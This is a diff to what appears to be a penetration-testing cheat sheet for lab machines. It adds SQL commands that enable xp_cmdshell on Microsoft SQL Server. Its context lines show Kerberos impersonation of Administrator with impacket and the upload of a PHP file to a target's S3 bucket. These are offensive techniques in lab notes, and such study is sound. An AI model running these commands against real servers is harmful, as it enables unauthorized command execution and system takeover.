@@ -95,6 +95,14 @@ impacket-getST -k -impersonate Administrator -spn cifs/HayStack.thm.corp thm.cor
 ```
 SQL (ARCHETYPE\sql_svc  dbo@master)> select is_srvrolemember('sysadmin');
 ```
+#### Configure if xp_cmdshell is not activated
+```
+EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+sp_configure; - Enabling the sp_configure as stated in the above error message
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+```
 
 
 # Kerbrute
@@ -157,3 +165,6 @@ aws --endpoint=http://domain.brnyr/ s3 ls
 aws --endpoint=http://domain.brnyr/ s3 ls s3://domain.brnyr
 aws  --endpoint=http://domain.brnyr/ s3 cp afile_toupload.php s3://domain.brnyr
 ```
+
+
+
